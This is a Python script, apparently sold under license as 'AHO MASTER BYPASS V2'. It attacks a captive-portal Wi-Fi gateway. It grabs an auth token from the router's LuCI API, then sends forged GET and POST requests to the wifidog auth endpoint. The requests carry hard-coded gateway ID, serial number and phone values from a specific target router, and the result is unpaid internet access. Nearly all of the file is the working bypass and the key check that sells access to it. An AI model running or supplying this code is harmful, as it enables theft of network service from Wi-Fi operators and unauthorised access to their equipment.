import sys, os, hashlib, subprocess, datetime, requests, time
from colorama import Fore, init

init(autoreset=True)

# --- [SECURITY & ENCRYPTION] ---
SALT = "AHO_PRO_FINAL_2026_SECURE"
KEY_FILE = os.path.expanduser("~/.aho_key_data")

# --- [TARGET ROUTER DATA - အစ်ကို့ Canary ထဲက အချက်အလက်များ] ---
TARGET_INFO = {
    "gw_ip": "192.168.110.1",
    "username": "810852",
    "phoneNumber": "381060",
    "gw_id": "58b4bbd9c1e9",
    "gw_sn": "H1U42FJ004707"
}

def get_net_time():
    try:
        res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
        return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
    except:
        return datetime.datetime.now()

def get_hwid():
    user = subprocess.check_output(['whoami']).decode().strip()
    return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"

def run_bypass_engine():
    """Key မှန်သွားရင် တိုက်ရိုက် အလုပ်လုပ်မယ့် Hack Engine"""
    print(f"\n{Fore.BLUE}[*] Initializing Bypass Engine...")
    
    with requests.Session() as s:
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})
        try:
            # ၁။ Token ကို Router ဆီက နှိုက်မယ်
            token_url = f"http://{TARGET_INFO['gw_ip']}/cgi-bin/luci/api/auth/token?username={TARGET_INFO['username']}"
            res = s.get(token_url, timeout=7)
            token = res.json().get("token", TARGET_INFO['username'])
            print(f"{Fore.GREEN}[✔] Token Inject: {token}")

            # ၂။ Bypass လုပ်မယ် (GET နှင့် POST နှစ်မျိုးလုံး စမ်းမယ်)
            auth_url = f"http://{TARGET_INFO['gw_ip']}:2060/wifidog/auth"
            params = {
                "token": token,
                "phoneNumber": TARGET_INFO['phoneNumber'],
                "gw_id": TARGET_INFO['gw_id'],
                "gw_sn": TARGET_INFO['gw_sn']
            }
            
            # Request ပစ်သွင်းခြင်း
            s.get(auth_url, params=params, timeout=10)
            s.post(auth_url, data=params, timeout=10)
            
            print(f"{Fore.YELLOW}----------------------------------------")
            print(f"{Fore.GREEN}🎉 SUCCESS! INTERNET ACTIVATED.")
            print(f"{Fore.YELLOW}----------------------------------------")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error: WiFi ချိတ်ထားလား၊ VPN ပိတ်လား ပြန်စစ်ပါ။")

def check_access():
    uid = get_hwid()
    now = get_net_time()

    # သိမ်းထားသော Key ရှိမရှိ စစ်ခြင်း
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            saved_key = f.read().strip()
        for i in range(0, 366):
            check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
            if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
                return True

    # Key တောင်းသည့် မျက်နှာပြင်
    os.system('clear')
    print(f"{Fore.MAGENTA}========================================")
    print(f"{Fore.CYAN}    AHO MASTER BYPASS V2 (OFFICIAL)")
    print(f"{Fore.MAGENTA}========================================")
    print(f"DEVICE ID: {Fore.YELLOW}{uid}")
    print(f"{Fore.WHITE}----------------------------------------")
    
    user_key = input(f"{Fore.GREEN}ENTER LICENSE KEY: ").strip()

    # Key Validation
    for i in range(0, 366):
        check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
        if user_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
            with open(KEY_FILE, "w") as f:
                f.write(user_key)
            print(f"{Fore.GREEN}[✔] KEY ACTIVATED!")
            return True
    return False

if __name__ == "__main__":
    if check_access():
        run_bypass_engine()
    else:
        print(f"{Fore.RED}[✘] INVALID KEY! PLEASE CONTACT ADMIN.")
